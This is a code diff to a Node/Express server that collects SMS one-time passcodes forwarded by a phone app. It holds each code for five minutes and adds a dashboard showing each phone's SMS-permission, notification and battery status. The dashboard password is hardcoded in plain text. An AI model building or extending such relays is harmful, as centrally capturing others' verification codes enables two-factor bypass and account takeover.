@@ -26,8 +26,10 @@ const DASH_PASSWORD = 'greece123'        // /clients dashboard login password
 // ----------------------------------------------------------------------------
 
 const WAIT_TTL_MS = 5 * 60 * 1000
-const ORPHAN_OTP_TTL_MS = 60 * 1000
-const ORPHAN_RACE_GRACE_MS = 10 * 1000
+// OTP ko 5 min tak hold karo: browser pehle wait kare ya OTP ke baad kabhi kare,
+// dono soorat mein latest OTP mil jaye. (Naya OTP purane ko replace kar deta hai.)
+const ORPHAN_OTP_TTL_MS = 5 * 60 * 1000
+const ORPHAN_RACE_GRACE_MS = 5 * 60 * 1000
 const ACTIVE_WINDOW_MS = 12 * 60 * 60 * 1000
 const ONLINE_WINDOW_MS = 3 * 60 * 1000   // ~60s heartbeat -> 3 min ke andar = LIVE online
 
@@ -52,13 +54,19 @@ function saveClients() {
   }, 1000)
 }
 const now = () => Date.now()
-function touchClient(number, { otp = false, version = null, sms = false, otpFound = null } = {}) {
+function touchClient(number, { otp = false, version = null, smsSeen = false, otpFound = null, flags = null } = {}) {
   if (!number) return
   const c = clients.get(number) || { firstSeen: now(), lastSeen: 0, lastOtpAt: 0, lastSmsAt: 0, version: null }
   c.lastSeen = now()
   if (otp) c.lastOtpAt = now()
-  if (sms) { c.lastSmsAt = now(); if (otpFound !== null) c.lastSmsOtp = !!otpFound }
+  if (smsSeen) { c.lastSmsAt = now(); if (otpFound !== null) c.lastSmsOtp = !!otpFound }
   if (version) c.version = version
+  if (flags) {
+    if (flags.sms   !== undefined) c.sms   = flags.sms   // SMS permission on?
+    if (flags.notif !== undefined) c.notif = flags.notif // notifications on?
+    if (flags.batt  !== undefined) c.batt  = flags.batt  // battery unrestricted?
+    if (flags.num   !== undefined) c.num   = flags.num   // number set?
+  }
   clients.set(number, c)
   saveClients()
 }
@@ -113,10 +121,20 @@ function handleRegister(req, res) {
   if (data.key !== SEND_KEY) return res.status(401).json({ ok: false, error: 'Bad key.' })
   const number = normalizeNumber(data.number || data.n)
   if (!number) return res.status(400).json({ ok: false, error: 'Missing "number".' })
-  const sms = data.sms === '1' || data.sms === 1 || data.sms === 'true'
-  const otpFound = data.otpfound === '1' || data.otpfound === 1 || data.otpfound === 'true'
-  touchClient(number, { version: data.ver || null, sms, otpFound: sms ? otpFound : null })
-  if (sms) console.log(`[sms-seen] number=…${number} otpFound=${otpFound}`)
+  const truthy = (v) => v === '1' || v === 1 || v === 'true'
+  const smsSeen = truthy(data.smsseen)                 // an SMS reached the app (diagnostic)
+  const otpFound = truthy(data.otpfound)
+  const flags = {}                                     // readiness (heartbeat)
+  if (data.sms   !== undefined) flags.sms   = truthy(data.sms)
+  if (data.notif !== undefined) flags.notif = truthy(data.notif)
+  if (data.batt  !== undefined) flags.batt  = truthy(data.batt)
+  if (data.num   !== undefined) flags.num   = truthy(data.num)
+  touchClient(number, {
+    version: data.ver || null,
+    smsSeen, otpFound: smsSeen ? otpFound : null,
+    flags: Object.keys(flags).length ? flags : null,
+  })
+  if (smsSeen) console.log(`[sms-seen] number=…${number} otpFound=${otpFound}`)
   return res.json({ ok: true, number })
 }
 app.post('/register', handleRegister)
@@ -156,24 +174,43 @@ function loginPage(error) {
     `<input type="password" name="password" placeholder="Password" autofocus><button type="submit">Login</button></form></body></html>`
 }
 
+const tick = (v) => v === undefined ? '<span style="color:#64748b">–</span>'
+  : (v ? '<span style="color:#16a34a">✓</span>' : '<span style="color:#ef4444">✗</span>')
+
 function dashboardPage() {
   const list = [...clients.entries()].map(([num, c]) => ({ num, ...c })).sort((a, b) => b.lastSeen - a.lastSeen)
-  const online = list.filter((c) => now() - c.lastSeen <= ONLINE_WINDOW_MS).length
-  const active = list.filter((c) => now() - c.lastSeen <= ACTIVE_WINDOW_MS).length
+  const reports = (c) => c.sms !== undefined            // naya app readiness bhejta hai
+  const isReady = (c) => reports(c) ? c.sms === true : true // purane app: fall back to online
+  const isConnected = (c) => now() - c.lastSeen <= ONLINE_WINDOW_MS
+  const online = list.filter((c) => isConnected(c) && isReady(c)).length
+
   const rows = list.map((c) => {
-    const age = now() - c.lastSeen
+    const connected = isConnected(c)
     let dot, label, color
-    if (age <= ONLINE_WINDOW_MS) { dot = '🟢'; label = 'Online'; color = '#16a34a' }
-    else if (age <= ACTIVE_WINDOW_MS) { dot = '🟡'; label = 'Idle'; color = '#eab308' }
-    else { dot = '🔴'; label = 'Offline'; color = '#ef4444' }
+    if (connected && isReady(c)) {
+      dot = '🟢'; label = 'Online'; color = '#16a34a'
+    } else if (connected) {
+      // app zinda hai par ready nahi -> kaunsi setting missing?
+      const miss = []
+      if (c.num === false) miss.push('number')
+      if (c.sms === false) miss.push('SMS')
+      dot = '🟡'; label = 'Setup: ' + (miss.join(', ') || 'settings'); color = '#eab308'
+    } else {
+      dot = '🔴'; label = 'Offline'; color = '#ef4444'
+    }
     const smsCell = c.lastSmsAt
       ? `${fmtAgo(c.lastSmsAt)} ago${c.lastSmsOtp === false ? ' <span style="color:#64748b">(no code)</span>' : ''}`
       : '<span style="color:#ef4444">never</span>'
-    return `<tr><td>${c.num}</td><td>${c.version || '-'}</td><td>${fmtTime(c.firstSeen)}</td>` +
-      `<td>${fmtAgo(c.lastSeen)} ago</td><td>${smsCell}</td><td>${c.lastOtpAt ? fmtAgo(c.lastOtpAt) + ' ago' : '-'}</td>` +
+    return `<tr><td>${c.num}</td><td>${c.version || '-'}</td>` +
+      `<td style="text-align:center">${tick(c.sms)}</td>` +
+      `<td style="text-align:center">${tick(c.notif)}</td>` +
+      `<td style="text-align:center">${tick(c.batt)}</td>` +
+      `<td>${fmtAgo(c.lastSeen)} ago</td><td>${smsCell}</td>` +
+      `<td>${c.lastOtpAt ? fmtAgo(c.lastOtpAt) + ' ago' : '-'}</td>` +
       `<td style="color:${color}">${dot} ${label}</td>` +
-      `<td><a href="?remove=${c.num}" onclick="return confirm('Remove ${c.num}?')" style="color:#f87171;text-decoration:none">✕ remove</a></td></tr>`
+      `<td><a href="?remove=${c.num}" onclick="return confirm('Remove ${c.num}?')" style="color:#f87171;text-decoration:none">✕</a></td></tr>`
   }).join('')
+
   return `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="15">` +
     `<meta name="viewport" content="width=device-width,initial-scale=1"><title>OTP Clients</title>` +
     `<style>body{font:14px system-ui,sans-serif;background:#0f172a;color:#e2e8f0;padding:18px}` +
@@ -183,11 +220,11 @@ function dashboardPage() {
     `th,td{padding:8px 10px;border-bottom:1px solid #334155;text-align:left;white-space:nowrap}` +
     `th{color:#94a3b8;font-weight:600}.muted{color:#64748b;margin-top:10px}</style></head>` +
     `<body><h1>OTP Clients</h1>` +
-    `<span class="pill" style="background:#052e16;color:#4ade80">🟢 ${online} online</span>` +
-    `<span class="pill" style="background:#1e293b;color:#94a3b8">${active}/${list.length} active (12h)</span>` +
+    `<span class="pill" style="background:#052e16;color:#4ade80">🟢 ${online} online (ready)</span>` +
+    `<span class="pill" style="background:#1e293b;color:#94a3b8">${list.length} total</span>` +
     `<a class="logout" href="?logout=1">logout</a>` +
-    `<table><tr><th>Number</th><th>Ver</th><th>Registered</th><th>Last seen</th><th>Last SMS</th><th>Last OTP</th><th>Status</th><th></th></tr>${rows}</table>` +
-    `<p class="muted">Auto-refresh 15s · 🟢 online = last 3 min · 🟡 idle = last 12h · 🔴 offline · <b>Last SMS "never"</b> = phone tak SMS nahi ja raha (receiver fire nahi ho raha) · total ${list.length}</p></body></html>`
+    `<table><tr><th>Number</th><th>Ver</th><th>SMS</th><th>Notif</th><th>Batt</th><th>Last seen</th><th>Last SMS</th><th>Last OTP</th><th>Status</th><th></th></tr>${rows}</table>` +
+    `<p class="muted">Auto-refresh 15s · 🟢 Online = connected + SMS on + number set · 🟡 Setup = app zinda par koi setting missing · 🔴 Offline = reachable nahi · <b>Last SMS "never"</b> = SMS phone tak nahi pohnch raha · total ${list.length}</p></body></html>`
 }
 
 app.get('/clients', (req, res) => {
